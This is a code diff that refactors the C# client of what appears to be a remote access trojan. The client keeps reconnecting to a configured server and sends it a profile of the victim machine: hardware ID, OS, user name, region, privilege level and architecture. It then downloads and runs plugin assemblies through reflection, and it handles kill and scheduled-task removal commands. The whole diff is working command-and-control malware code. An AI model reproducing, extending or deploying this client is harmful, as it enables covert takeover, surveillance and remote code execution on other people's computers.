@@ -20,60 +20,74 @@ namespace Client
 {
     public class Client
     {
-        public Socket S;
-        public Host WorkingHost;
-        public IPEndPoint ep;
-        public string HWID { get; set; }
+        private Socket _S;
+        private Host WorkingHost;
+        private IPEndPoint IpEndPt;
+        //public IPAPI.IP ClientCountry;
+        private string HWID { get; set; }
 
         public Client(Host H) 
         {
             this.HWID = HwidGen.HWID();
             this.WorkingHost = H;
-            ep = new IPEndPoint(IPAddress.Parse(WorkingHost.host), WorkingHost.port);
+            IpEndPt = new IPEndPoint(IPAddress.Parse(WorkingHost.host), WorkingHost.port);
             try
             {
-                S = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-                S.ReceiveBufferSize = Shared.Utils.BufferSize;
-                S.SendBufferSize = Shared.Utils.BufferSize;
-                S.Connect(ep);
-                if (S.Connected)
+                _S = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+                _S.ReceiveBufferSize = Shared.Utils.BufferSize;
+                _S.SendBufferSize = Shared.Utils.BufferSize;
+                _S.Connect(IpEndPt);
+                if (_S.Connected)
                 {
                     Thread T = new Thread(() => ReadData());
                     T.Start();
-                    SendID();
+                    SendId();
                 }           
             }
             catch (Exception)
             {
-                while (S.Connected == false)
+                while (_S.Connected == false)
 
                 {
                     try
                     {
-                        S.Connect(ep);
-                        if (S.Connected)
+                        _S.Connect(IpEndPt);
+                        if (_S.Connected)
                         {
                             Thread T = new Thread(() => ReadData());
                             T.Start();
-                            SendID();
+                            SendId();
                             return;
                         }                      
                     }
-                    catch{}
+                    catch(Exception){}
 
                     Thread.Sleep(1500);
                 }
             }
         }
-        private void SendID() 
+        private void SendId() 
         {
             Microsoft.VisualBasic.Devices.Computer I = new Microsoft.VisualBasic.Devices.Computer();
-            List<string> DataToSend = new List<string>() {this.HWID, I.Info.OSFullName, Environment.UserName, I.Info.OSVersion, RegionInfo.CurrentRegion.Name + " - " + RegionInfo.CurrentRegion.EnglishName, Process.GetCurrentProcess().Handle.ToString(), Utils.Privilege(), Utils.Check64Bit() };
-            Data DD = new Data();
-            DD.Type = PacketTypes.PacketType.ID;
-            DD.HWID = this.HWID;
-            DD.DataReturn = new object[] { DataToSend };
-            SendData(S, Encryption.RSMTool.RSMEncrypt(DD.Serialize(), Encoding.Unicode.GetBytes(Starting.Key)));
+
+            //string country = Utils.CountryInformation(Strings.Split(S.LocalEndPoint.ToString(), ":")[0], ref ClientCountry);
+ 
+            List<string> DataToSend = new List<string>() 
+            {   this.HWID, 
+                I.Info.OSFullName, 
+                Environment.UserName, 
+                I.Info.OSVersion, 
+                RegionInfo.CurrentRegion.Name + " - " + RegionInfo.CurrentRegion.EnglishName, 
+                Process.GetCurrentProcess().Handle.ToString(), 
+                Utils.Privilege(), 
+                Utils.Check64Bit(),
+                RegionInfo.CurrentRegion.Name.ToLower(),
+            };
+            Data data = new Data();
+            data.Type = PacketType.ID;
+            data.HWID = this.HWID;
+            data.DataReturn = new object[] { DataToSend };
+            SendData(_S, Encryption.RSMTool.RSMEncrypt(data.Serialize(), Encoding.Unicode.GetBytes(Utils.Key)));
         }
         private void ReadData()
         {
@@ -81,21 +95,23 @@ namespace Client
             {
                 while (true)
                 {
-                    byte[] data = Encryption.RSMTool.RSMDecrypt(ReceiveData(S), Encoding.Unicode.GetBytes(Starting.Key));
+                    byte[] data = Encryption.RSMTool.RSMDecrypt(ReceiveData(_S), Encoding.Unicode.GetBytes(Utils.Key));
                     if (data.Length > 0)
                     {
                         Data D = Shared.Serializer.Deserialize(data);
-                        if (D.Type == PacketTypes.PacketType.CLOSE)
+                        switch (D.Type) 
                         {
-                            NtTerminateProcess(Process.GetCurrentProcess().Handle, 0);
-                        }
-                        else if (D.Type == PacketTypes.PacketType.UNINSTALL_TASKSCH) 
-                        {
-                            Utils.RemoveTaskScheduler();
-                        }
-                        else
-                        {
-                            Task.Run(() => Launch(Compressor.QuickLZ.Decompress(D.Plugin), D.DataReturn, D.IP_Origin));
+                            case PacketType.CLOSE:
+                                //TODO : choose to delete the client after closed and killed
+                                NtTerminateProcess(Process.GetCurrentProcess().Handle, 0);
+                                break;
+                            case PacketType.UNINSTALL_TASKSCH:
+                                Utils.RemoveTaskScheduler();
+                                break;
+                            default:
+                                //Task.Run(() => Launch(Compressor.QuickLZ.Decompress(D.Plugin), D.DataReturn, D.IP_Origin));
+                                new Thread(() => Launch(Compressor.QuickLZ.Decompress(D.Plugin), D.DataReturn, D.IP_Origin)).Start();
+                                break;
                         }
                     }
                 }
@@ -114,7 +130,7 @@ namespace Client
                 System.Reflection.MethodInfo method = null;
                 method = assemblytoload.GetType("Plugin.Launch").GetMethod("Main");
                 object obj = assemblytoload.CreateInstance(method.Name);
-                await Task.Run(() => method.Invoke(obj, new object[] { WorkingHost, this.HWID, Param, this.S, Starting.Key, IP }));
+                await Task.Run(() => method.Invoke(obj, new object[] { WorkingHost, this.HWID, Param, this._S, Utils.Key, IP }));
             }
             catch{}
             finally 
@@ -124,42 +140,40 @@ namespace Client
         }       
         private void CheckConnection()
         {
-            while (true)
+            Thread.Sleep(1000);
+            try
             {
-                Thread.Sleep(1000);
+                _S.Send(Shared.Utils.b, 0, 0);
+            }
+            catch (Exception)
+            {
                 try
                 {
-                    S.Send(Shared.Utils.b, 0, 0);
-                }
-                catch (Exception)
-                {
-
-                    try
+                    _S = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+                    _S.ReceiveBufferSize = Shared.Utils.BufferSize;
+                    _S.SendBufferSize = Shared.Utils.BufferSize;
+                    _S.Connect(IpEndPt);
+                    
+                    if (_S.Connected == true)
                     {
-                        S = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-                        S.ReceiveBufferSize = Shared.Utils.BufferSize;
-                        S.SendBufferSize = Shared.Utils.BufferSize;
-                        S.Connect(ep);
-
-                        if (S.Connected == true)
-                        {
-                            Thread O = new Thread(() => ReadData());
-                            O.Start();
-                            SendID();
-                            return;
-                        }
+                        Thread O = new Thread(() => ReadData());
+                        O.Start();
+                        SendId();
+                        return;
                     }
-                    catch{}
+                }
+                catch (Exception) 
+                { 
+                    CheckConnection();
                 }
             }
         }
         private byte[] ReceiveData(Socket S)
         {
             int total = 0;
-            int recv;
             byte[] datasize = new byte[4];
             S.Poll(-1, SelectMode.SelectRead);
-            recv = S.Receive(datasize, 0, 4, 0);
+            int recv = S.Receive(datasize, 0, 4, 0);
             int size = BitConverter.ToInt32(datasize, 0);
             int dataleft = size;
             byte[] data = new byte[size];
